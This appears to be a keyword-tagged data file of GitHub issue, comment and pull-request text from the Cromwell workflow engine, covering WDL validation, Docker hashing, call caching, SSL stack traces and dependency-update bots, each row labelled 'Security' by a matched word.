Security,"This wdl should fail validation because `Array[String]fq_set_out` is declared in both conditional blocks. ```; scatter(sample in read_tsv(samples_file)) {; call MakeDirs {; input:; output_dir = output_dir,; sample_name = sample[0]; }; if (length(sample) == 2) {; call SamToFastq {; input:; picard_path = picard_path,; read_data = sample[1],; sample_name = sample[0],; sample_dir = MakeDirs.sample_dir; }; Array[String]fq_set_out = SamToFastq.fq_set; }; if (length(sample) == 3) {; call CopyFastq {; input:; fq1 = sample[1],; fq2 = sample[2],; sample_name = sample[0],; sample_dir = MakeDirs.sample_dir; }; Array[String]fq_set_out = CopyFastq.fq_set; }; call AlignBAM {; input:; new_ref = IndexReference.gatk_ref,; sample_dir = MakeDirs.sample_dir,; sample_name = sample[0],; fq_set = fq_set_out; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2232:21,validat,validation,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2232,1,['validat'],['validation']
Security,This will allow us to make other changes to Cromwell and have the tests pass while we figure out what's wrong with SSH access.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6728:119,access,access,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6728,1,['access'],['access']
Security,This would be useful to us as well. We have a similar case where we have a large reference collection that we don't want to have to fetch every time. For our now AWS deploys we can override the submit-docker parameter to add the mount. But this isn't exposed for this backend. It would be nice if we could fully customize the docker command similar to what is possible with ConfigBackendLifecycleActorFactory.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4579#issuecomment-754945786:251,expose,exposed,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4579#issuecomment-754945786,1,['expose'],['exposed']
Security,"Though I guess if they really are pluggable backends, then somebody can create their own SBT project and include whatever they want as long as it exposes a class that adheres to the Actor interface. So we really can't stop differing versions of Akka or any other shared package, right?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-192392206:146,expose,exposes,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-192392206,1,['expose'],['exposes']
Security,"Thoughts for a Monday Tech Talk™️:. Say we run a workflow with a 100-wide scatter and the floating Docker tags are resolved to hashes during workflow initialization. 90 of the jobs launch, but then the server goes down. The server comes up some time later and recovers the first 90 running jobs, but in the meantime the floating Docker tag has moved to a new version. We rerun the workflow initialization and calculate a different hash for the remaining 10 shards of the scatter. . It seems the hash for a Docker tag for a particular workflow should be persisted to be able to handle this case. I also wonder per @cjllanwarne if we shouldn't keep this activity in the `JobPreparationActor` to avoid knowingly creating a system that we'll have to replace when we implement dynamic dispatch. Keeping this in `JobPreparationActor` would also give us greater ability to resolve expressions for Docker tags than if we do this earlier in the workflow lifecycle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289168497:127,hash,hashes,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289168497,3,['hash'],"['hash', 'hashes']"
Security,"TlsHandler#0, WriteBufferingAndExceptionHandler#0, DefaultChannelPipeline$TailContext#0]; at io.grpc.Status.asRuntimeException(Status.java:539); ... 14 common frames omitted; Caused by: javax.net.ssl.SSLHandshakeException: General OpenSslEngine problem; at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.handshakeException(ReferenceCountedOpenSslEngine.java:1907); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.wrap(ReferenceCountedOpenSslEngine.java:834); at java.base/javax.net.ssl.SSLEngine.wrap(SSLEngine.java:564); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.wrap(SslHandler.java:1041); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.wrapNonAppData(SslHandler.java:927); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1409); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.unwrapNonAppData(SslHandler.java:1327); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler.access$1800(SslHandler.java:169); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.resumeOnEventExecutor(SslHandler.java:1718); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.access$2000(SslHandler.java:1609); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner$2.run(SslHandler.java:1770); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:174); at io.grpc.netty.shaded.io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:167); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470); at io.grpc.netty.shaded.io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:403); at io.grpc.netty.shaded.io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997); at io.grpc.netty.shaded.io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:5693,access,access,5693,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['access'],['access']
Security,"To accept this bug report, we would probably ask the user to try; ```; gsutil -q -m cp gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list ~/test_file; ```; on their local machine to make sure permissions are workable and it's really Cromwell that is screwing up. Unfortunately the user is no longer at Broad (hi Lee!) and I am not aware of a systemic problem in this area, so I will close the issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1960#issuecomment-665698064:112,access,access,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1960#issuecomment-665698064,1,['access'],['access']
Security,To be further refined:; Allow docker hash request to docker daemon / docker cli.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2095:37,hash,hash,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2095,1,['hash'],['hash']
Security,To be further refined:; Enable backends to record whether the a docker tag or docker hash was/will-be used for a job.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2096:85,hash,hash,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2096,1,['hash'],['hash']
Security,To be further refined:; Move docker hash request/response handling from Job Preparation to Workflow Materialization (or similar).,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2094:36,hash,hash,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2094,1,['hash'],['hash']
Security,"To clarify @geoffjentry: if `write_lines` is in a declaration (e.g. `File fofn = write_lines(file_refs)`) then that's evaluated and used for CC (and with changeable paths being hashed, CC will miss, just like today). . So to make CC work as you'd want in this new scheme, the `write_lines` would have to be in the command block (e.g. `command { ./foo.sh write_lines(file_refs) }`).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305989869:177,hash,hashed,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305989869,1,['hash'],['hashed']
Security,"To clarify the current situation... Most of these ""don't affect the results"" attributes are indeed ignored for call caching. But workflow inputs are all used. So, if it's a hard-coded value it won't be call cached, but if the attribute is set by an expression based on an input, the input value will be hashed even if the runtime attribute value isn't. Hope that made sense...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2927#issuecomment-348292881:303,hash,hashed,303,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2927#issuecomment-348292881,1,['hash'],['hashed']
Security,"To create a workflow, send a message to WorkflowValidationActor with WorkflowSourceFiles, it tries to build a namespace and coerced inputs. If this passes, iterate the backends sending validation messages to the BackendWorkflowValidationActors. The workflow is validated if it passes one of these.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/433:185,validat,validation,185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/433,2,['validat'],"['validated', 'validation']"
Security,"To effectively use ""Retry with More Memory"" for JVM jobs running on Papi one has to use `MEM_SIZE` and `MEM_UNIT` to run with the correct memory settings. But those variables were not available on any other backends. Therefore one ended up having to use other creative options for [authoring multi-backend WDL](https://github.com/broadinstitute/warp/issues/481) such as using [`free`](https://github.com/broadinstitute/warp/pull/197/files/ae14bee73c07684b97dad22b8f3de53ff6404afe..f0692505010baa576f9fe09578fa001661a55145#r735883251). This PR exposes those two environment variables to the `command` block on any Cromwell ""standard"" backend that supports the `memory` runtime attribute. Using the environment variables also helps with call caching java jobs. One can use something along the lines of `-Xmx${MEM_SIZE%.*}${MEM_UNIT%?}` in a version 1.0+ WDL and the command block will stay the same even if the memory needs to be increased. <hr/>. Side note: If anyone comes across this PR and wonders why the default `Local` backend doesn't support `MEM_SIZE` and `MEM_UNIT` it's because the Local backend does not use `memory` (nor `cpu` at the moment). The `memory` runtime attribute would need to be added into the [runtime attributes](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L12) with something like:. ```hocon; runtime-attributes = """"""; String? docker; String? docker_user; Int memory_mb = 2048; """"""; ```. And then inside [`submit-docker`](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L14-L34) use `--memory=${memory_mb}m`. Then the changes in this PR will generate `MEM_SIZE` and `MEM_UNIT` for the Local backend too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430:543,expose,exposes,543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430,1,['expose'],['exposes']
Security,"To follow up #1653, would it be possible to have cromwell server mode be configurable to listen on a socket file, as an option instead of a TCP listener? With correct permissions, this would allow a user to run a cromwell server that's listener is in a protected location?. This would allow regular users, who would not have access to set firewall rules on hosts, the tools they need to run their own secure listener. Cheers!; CanWood",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2637:325,access,access,325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2637,3,"['access', 'firewall', 'secur']","['access', 'firewall', 'secure']"
Security,"To keep ourselves honest, and convince ourselves that this is a swappable service rather than a core part of cromwell, I would like to see all of the metadata database access stuff in the `services.metadata` package rather than the engine's `dataAccess` parts",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/851#issuecomment-220343998:168,access,access,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/851#issuecomment-220343998,1,['access'],['access']
Security,"To make cromwell a bit more self-sufficient as a ""server"", having access to `wdltool inputs` as an API endpoint would avoid needing to orchestrate a client having access to wdltool for that functionality.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2651:66,access,access,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2651,2,['access'],['access']
Security,"To make cromwell a bit more self-sufficient as a ""server"", having access to `wdltool validate` as an API endpoint would avoid needing to orchestrate a client having access to wdltool for that functionality. . This issue is a companion to #2651.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2652:66,access,access,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2652,3,"['access', 'validat']","['access', 'validate']"
Security,"To make it less of a blind hunt, it's also possible to look into your Stackdriver Audit logs - they should list all GCP API calls in your project that failed with 403. This way you can get a better sense of which ones Cromwell is actually using. I've been meaning to write a tool to simplify this kind of analysis, but you can do it with the logs even now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685185759:82,Audit,Audit,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685185759,1,['Audit'],['Audit']
Security,"Today, there is a demo-dos filesystem that has some one functionality: being able to convert dos URIs into GS paths. . AC: ; We would like to add more functionalities for the DOS filesystem, such as:; 1. Being able to get an file hash for any given DOS URI (for call caching); 2. Being able to get the size for any given DOS URI (for commonly used workflow operations). ```; workflow w {; File input_bam = ""dos://guid""; Float size_in_gb = size(input_bam); }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4291:230,hash,hash,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4291,1,['hash'],['hash']
Security,"Travis doesn't seem to work quite right with PRs with identical hashes matching the external contributors. Scriptify the experience of creating or updating a PR branch, and salting it so that the hash is different (and so that Travis will pick it up correctly).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5333:64,hash,hashes,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5333,2,['hash'],"['hash', 'hashes']"
Security,Travis thinks you forgot to update some hash expectations,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/616#issuecomment-201246839:40,hash,hash,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/616#issuecomment-201246839,1,['hash'],['hash']
Security,TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:284); at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:144); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslClientContext$ExtendedTrustManagerVerifyCallback.verify(ReferenceCountedOpenSslClientContext.java:234); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslContext$AbstractCertificateVerifier.verify(ReferenceCountedOpenSslContext.java:779); at io.grpc.netty.shaded.io.netty.internal.tcnative.CertificateVerifierTask.runTask(CertificateVerifierTask.java:36); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:48); at io.grpc.netty.shaded.io.netty.internal.tcnative.SSLTask.run(SSLTask.java:42); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.runAndResetNeedTask(ReferenceCountedOpenSslEngine.java:1496); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine.access$700(ReferenceCountedOpenSslEngine.java:94); at io.grpc.netty.shaded.io.netty.handler.ssl.ReferenceCountedOpenSslEngine$TaskDecorator.run(ReferenceCountedOpenSslEngine.java:1471); at io.grpc.netty.shaded.io.netty.handler.ssl.SslHandler$SslTasksRunner.run(SslHandler.java:1787); at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144); at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642); ... 1 common frames omitted; Caused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; at java.base/sun.security.provider.certpath.SunCertPathBuilder.build(SunCertPathBuilder.java:148); at java.base/sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:129); at java.base/java.security.cert.CertPathBuilder.build(CertPathBuilder.java:297); at java.base/sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:383); ... 16 common frames,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7551:8315,access,access,8315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7551,1,['access'],['access']
Security,Try to reproduce hashing timeouts in a cromwell that's not being spammed on /stats,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3712:17,hash,hashing,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3712,1,['hash'],['hashing']
Security,Type-checking issue with member access in conditionals,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3790:32,access,access,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3790,1,['access'],['access']
Security,"URL:; https://github.com/broadinstitute/cromwell/releases/download/28/cromwell-28.jar. Expected SHA-256: 25c6c30fe062fb4a8384ef82aa5313ad5a5ee05eae62a2c831219d7c6c756347. Actual SHA-256:; c9ce762df236588ded042ceaf099848c0c1685d34788442ee251615ff13b5190. The expected checksum is what what we had in Homebrew for the SHA-256 when the formula was upgraded to version 28 on Fri Jun 30 12:44:57 2017 -0700. See https://github.com/Homebrew/homebrew-core/pull/15166. But currently downloading the file gives a different checksum. I wanted to make sure you weren't hacked, and ask what the reason(s) for the changes were.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2463:267,checksum,checksum,267,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2463,2,['checksum'],['checksum']
Security,"Unfortunately the `Directory` type is a feature of a not-currently-supported WDL version. . You can probably get preview-level access to this via `version development` but I certainly wouldn’t rely on features there yet. They might change - or disappear completely - as part of development of WDL 1.1 and subsequent version. In fact, WDL 1.1 explicitly does NOT include the `Directory` type so even the current level of support may be temporarily removed in future versions of Cromwell, until we start development on a version of WDL which does include the type. The good news is that if and when we do officially support the `Directory` type in that future version of WDL, we will support proper handling of the type, including call caching, but the bad news is that it’s not an active development priority right now, so I can’t give you a proper timeline for support. Sorry!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-936922021:127,access,access,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6509#issuecomment-936922021,1,['access'],['access']
Security,Update CWL conformance test git hash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3627:32,hash,hash,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3627,1,['hash'],['hash']
Security,Update comment about disabling SSH access test [CROM-6872],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6732:35,access,access,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6732,1,['access'],['access']
Security,Update no_input_delete source files directory and assert their accessibility [CROM-6890],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6727:63,access,accessibility,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6727,1,['access'],['accessibility']
Security,Updated a quay tag's hash & manipulate null outputs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3361:21,hash,hash,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3361,1,['hash'],['hash']
Security,Updated cromwell.yaml for new Validate endpoint arg,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/423:30,Validat,Validate,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/423,1,['Validat'],['Validate']
Security,"Updates ; * [ch.qos.logback:logback-access](https://github.com/qos-ch/logback); * [ch.qos.logback:logback-classic](https://github.com/qos-ch/logback); * [ch.qos.logback:logback-core](https://github.com/qos-ch/logback). from 1.2.11 to 1.4.5. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/9367739b48d1bae5766674e547f8cdf8a82d318a/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""ch.qos.logback"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""30 days"" },; dependency = { groupId = ""ch.qos.logback"" }; }]; ```; </details>. labels: library-update, early-semver-minor, semver-spec-minor, commit-count:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7026:36,access,access,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7026,1,['access'],['access']
Security,"Updates ; * ch.qos.logback:logback-access; * ch.qos.logback:logback-classic; * ch.qos.logback:logback-core. from 1.2.10 to 1.2.11. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/2dc2301e75aea6c2d0c49b89d6092f7d4f134b40/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""ch.qos.logback"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""@monthly"" },; dependency = { groupId = ""ch.qos.logback"" }; }]; ```; </details>. labels: library-update, early-semver-patch, semver-spec-patch, commit-count:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6842:35,access,access,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6842,1,['access'],['access']
Security,"Updates ; * ch.qos.logback:logback-access; * ch.qos.logback:logback-classic; * ch.qos.logback:logback-core. from 1.2.5 to 1.2.6. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/6472b97b3365f2800f4202d1bf6b1d647bd2b0cc/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (1.2.5).; You might want to review and update them manually.; ```; cwl/src/test/resources/cwl/ontology/EDAM.owl; ```; </details>; <details>; <summary>Ignore future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""ch.qos.logback"" } ]; ```; </details>. labels: library-update, semver-patch, old-version-remains",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6511:35,access,access,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6511,1,['access'],['access']
Security,"Updates ; * ch.qos.logback:logback-access; * ch.qos.logback:logback-classic; * ch.qos.logback:logback-core. from 1.2.6 to 1.2.10. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/00809e6249b134635f71919c17c1c81603beb22d/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Ignore future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""ch.qos.logback"" } ]; ```; </details>. labels: library-update, early-semver-patch, semver-spec-patch, commit-count:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6598:35,access,access,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6598,1,['access'],['access']
Security,"Updates [com.azure:azure-security-keyvault-secrets](https://github.com/Azure/azure-sdk-for-java) from 4.3.4 to 4.3.5. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/00809e6249b134635f71919c17c1c81603beb22d/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Ignore future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""com.azure"", artifactId = ""azure-security-keyvault-secrets"" } ]; ```; </details>. labels: library-update, early-semver-patch, semver-spec-patch, commit-count:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6602:25,secur,security-keyvault-secrets,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6602,2,['secur'],['security-keyvault-secrets']
Security,"Updates [com.azure:azure-security-keyvault-secrets](https://github.com/Azure/azure-sdk-for-java) from 4.3.7 to 4.3.8. I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/2dc2301e75aea6c2d0c49b89d6092f7d4f134b40/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""com.azure"", artifactId = ""azure-security-keyvault-secrets"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""@monthly"" },; dependency = { groupId = ""com.azure"", artifactId = ""azure-security-keyvault-secrets"" }; }]; ```; </details>. labels: library-update, early-semver-patch, semver-spec-patch, commit-count:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6845:25,secur,security-keyvault-secrets,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6845,3,['secur'],['security-keyvault-secrets']
Security,"Updates [com.eed3si9n:sbt-assembly](https://github.com/sbt/sbt-assembly) from 1.1.1 to 1.2.0.; [GitHub Release Notes](https://github.com/sbt/sbt-assembly/releases/tag/v1.2.0) - [Version Diff](https://github.com/sbt/sbt-assembly/compare/v1.1.1...v1.2.0). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/9367739b48d1bae5766674e547f8cdf8a82d318a/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (1.1.1).; You might want to review and update them manually.; ```; womtool/src/test/resources/validate/wdl_draft3/valid/arrays_v1/arrays_v1.inputs.json; ```; </details>; <details>; <summary>Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""com.eed3si9n"", artifactId = ""sbt-assembly"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""30 days"" },; dependency = { groupId = ""com.eed3si9n"", artifactId = ""sbt-assembly"" }; }]; ```; </details>. labels: sbt-plugin-update, early-semver-minor, semver-spec-minor, old-version-remains, commit-count:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7032:962,validat,validate,962,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7032,1,['validat'],['validate']
Security,"Updates [com.github.pathikrit:better-files](https://x-access-token@github.com/pathikrit/better-files) from 3.9.1 to 3.9.2.; [GitHub Release Notes](https://x-access-token@github.com/pathikrit/better-files/releases/tag/v3.9.2) - [Changelog](https://x-access-token@github.com/pathikrit/better-files/blob/master/CHANGES.md) - [Version Diff](https://x-access-token@github.com/pathikrit/better-files/compare/v3.9.1...v3.9.2). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/9367739b48d1bae5766674e547f8cdf8a82d318a/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""com.github.pathikrit"", artifactId = ""better-files"" } ]; ```; Or, add this to slow down future updates of this dependency:; ```; dependencyOverrides = [{; pullRequests = { frequency = ""30 days"" },; dependency = { groupId = ""com.github.pathikrit"", artifactId = ""better-files"" }; }]; ```; </details>. labels: library-update, early-semver-patch, semver-spec-patch, commit-count:1",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7034:54,access,access-token,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7034,4,['access'],['access-token']
